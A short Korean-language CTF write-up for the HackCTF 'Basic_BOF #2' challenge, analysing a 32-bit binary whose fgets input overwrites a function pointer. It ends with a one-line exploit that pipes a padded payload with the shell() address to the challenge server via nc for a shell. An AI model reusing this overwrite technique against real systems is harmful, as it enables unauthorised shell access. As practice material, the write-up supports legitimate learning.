---


---

<h1 id="hackctfbasic_bof-2">HackCTF:Basic_BOF #2</h1>
<h2 id="section">2019-08-01</h2>
<p><code>file bof_basic2</code> 로 파일을 확인해 본다.</p>
<pre><code>bof_basic2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=620fa5ad29722b0b2f66ce8f949ec66aa57b46f3, not stripped
</code></pre>
<p><em>IDA-Hexlay</em></p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+Ch] [ebp-8Ch]
  void (*v5)(void); // [esp+8Ch] [ebp-Ch]

  v5 = (void (*)(void))sup;
  fgets(&amp;s, 133, stdin);
  v5();
  return 0;
}
</code></pre>
<p>함수 <code>fgets()</code>로 들어가는 변수의 주소는 ebp-0x8c (ebp-140)이다. 140byte지만 133byte의 제한이 걸려있다.</p>
<pre><code>0x080484f0 &lt;+35&gt;:	push   eax
0x080484f1 &lt;+36&gt;:	push   0x85
0x080484f6 &lt;+41&gt;:	lea    eax,[ebp-0x8c]
0x080484fc &lt;+47&gt;:	push   eax
0x080484fd &lt;+48&gt;:	call   0x8048350 &lt;fgets@plt&gt;
0x08048502 &lt;+53&gt;:	add    esp,0x10
0x08048505 &lt;+56&gt;:	mov    eax,DWORD PTR [ebp-0xc]
0x08048508 &lt;+59&gt;:	call   eax
</code></pre>
<p>프로그램에 system("/bin/bash") 를 호출하는 <code>shell()</code> 이라는 함수가 있다는 것을 IDA로 확인했다.</p>
<pre><code>(python -c 'print "A" * 128 + "\x9b\x84\x04\x08"'; cat) | nc ctf.j0n9hyun.xyz 3001
</code></pre>

